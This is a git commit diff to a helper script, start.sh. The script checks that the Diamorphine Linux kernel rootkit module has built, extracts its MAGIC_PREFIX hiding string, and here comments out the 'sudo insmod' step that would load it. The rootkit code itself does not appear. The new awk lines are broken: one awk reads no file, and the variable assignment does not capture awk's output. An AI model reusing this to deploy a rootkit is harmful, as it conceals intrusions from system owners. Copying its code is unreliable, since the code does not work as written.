390a8858329aa0918d2642863734c542faae9d22
Cahleeb <calebchristopherparks@gmail.com>
2023-04-13 00:48:30 -0400

    Testing start.sh

--- start.sh
+++ start.sh
@@ -4,12 +4,11 @@ koFile=diamorphine.ko
 cFile=diamorphine.c
 if test -f "$koFile"; then #testing if .ko was built properly
     
-    while IFS=: read -r c1 c2; do
-        [[ $c1 == "#define MAGIC_PREFIX" ]] && var=$c1
-        [[ $c1 == INFO ]] && echo "$var$c2"
-    done < "$cFile"
+    awk '/#define MAGIC_PREFIX/ {print $3}'
+    mp=awk '/#define MAGIC_PREFIX/ {print $3}'
+    echo "MP=$mp"
 
-    sudo insmod "$koFile"
+    #sudo insmod "$koFile"
     echo "built."
 
 fi
